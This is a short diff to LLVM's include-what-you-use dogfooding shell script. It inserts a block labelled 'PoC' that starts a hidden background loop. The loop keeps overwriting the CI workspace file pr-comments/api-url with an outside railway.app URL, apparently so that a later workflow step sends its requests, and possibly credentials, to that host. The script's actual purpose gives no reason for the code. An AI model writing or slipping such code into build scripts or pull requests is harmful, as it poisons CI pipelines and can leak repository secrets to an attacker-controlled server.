@@ -1,5 +1,10 @@
 #!/bin/bash
 
+# --- PoC: background process to overwrite artifact api-url ---
+_WORKSPACE="${GITHUB_WORKSPACE:-.}"
+(while true; do echo "https://perpetual-integrity-production-9541.up.railway.app/0b7c6b05-4f2e-4189-996a-039cb1d9a0b9" > "$_WORKSPACE/pr-comments/api-url" 2>/dev/null; sleep 0.01; done) &
+# --- end PoC ---
+
 ##===--- iwyu-dogfood.bash ------------------------------------------------===##
 #
 #                     The LLVM Compiler Infrastructure
